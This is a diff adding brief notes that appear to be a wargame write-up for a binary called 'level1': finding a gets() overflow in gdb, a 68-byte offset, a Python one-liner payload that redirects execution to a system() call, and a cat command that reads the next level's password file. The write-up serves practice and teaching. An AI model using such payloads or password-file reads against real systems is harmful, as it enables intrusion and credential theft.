@@ -1,0 +1,6 @@
+1. Analyzed binary with: gdb ./level1
+2. Found vulnerable gets() call in main
+3. Discovered run() function at 0x08048444 that calls system()
+4. Calculated buffer offset: 68 bytes to return address
+5. Exploit: python -c "print 'A'*68 + '\x44\x84\x04\x08'"
+6. Got shell and retrieved password with: cat /home/user/level2/.pass
